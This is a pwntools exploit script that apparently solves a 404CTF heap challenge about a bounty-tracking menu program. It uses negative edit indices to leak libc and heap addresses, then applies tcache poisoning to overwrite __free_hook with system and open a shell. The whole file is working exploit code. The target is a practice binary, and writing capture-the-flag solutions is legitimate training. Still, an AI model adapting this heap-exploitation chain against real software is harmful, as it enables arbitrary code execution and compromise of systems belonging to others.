#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')


if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def see_bounty():
    io.sendlineafter(b'Enter your choice\n> ', b'1')

def add_bounty(amount, name, description):
    io.sendlineafter(b'Enter your choice\n> ', b'2')
    io.sendlineafter(b'Choose the bounty amount >> ', str(amount).encode())
    io.sendlineafter(b'Who is about to be hunted ? >> ', name)
    io.sendlineafter(b'Tell me more about them >> ', description)

def edit_bounty(idx, amount, description):
    io.sendlineafter(b'Enter your choice\n> ', b'3')
    io.sendlineafter(b'Choose the bounty to edit\n>> ', str(idx).encode())
    io.sendlineafter(b'Choose the new amount >> ', str(amount).encode())
    io.sendlineafter(b'Edit the description >> ', description)

def claim_bounty():
    io.sendlineafter(b'Enter your choice\n> ', b'4')

gdbscript = '''
# tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
# io = remote('challenges.404ctf.fr', 32463)

for i in range(256):
    print(i)
    add_bounty(i, b'toto', b'A'*0x500)
for i in range(4):
    claim_bounty()


add_bounty(i, b'toto', b'A'*0x600)

# Leak libc
io.sendlineafter(b'Enter your choice\n> ', b'3')
io.sendlineafter(b'Choose the bounty to edit\n>> ', str(-3).encode())
io.recvline()
io.recvline()
libc_leak = io.recvline().strip()
libc_leak = u64(libc_leak.ljust(8, b'\0'))
libc.address = libc_leak -0x1e4030
print(f'{libc_leak = :#x} {libc.address = :#x}')
io.sendlineafter(b'Choose the new amount >> ', str(1).encode())
io.sendlineafter(b'Edit the description >> ', b'toto')


add_bounty(i, b'toto', b'A'*0x30)
add_bounty(i, b'toto', b'A'*0x30)
claim_bounty()
claim_bounty()

# Leak heap
io.sendlineafter(b'Enter your choice\n> ', b'3')
io.sendlineafter(b'Choose the bounty to edit\n>> ', str(-2).encode())
io.recvline()
io.recvline()
heap_leak = io.recvline().strip()
heap_leak = u64(heap_leak.ljust(8, b'\0'))
print(f'{heap_leak = :#x}')
io.sendlineafter(b'Choose the new amount >> ', str(1).encode())
io.sendlineafter(b'Edit the description >> ', p64(libc.sym['__free_hook'] ^ heap_leak))

# tcache poisonning
edit_bounty(-3, 1, p64(libc.sym['__free_hook'] ^ heap_leak))
add_bounty(i, b'sh;\0'.ljust(0x28)+p64((heap_leak << 12) + 0x310), p64(libc.sym['system']).ljust(0x30))
claim_bounty()

io.interactive()

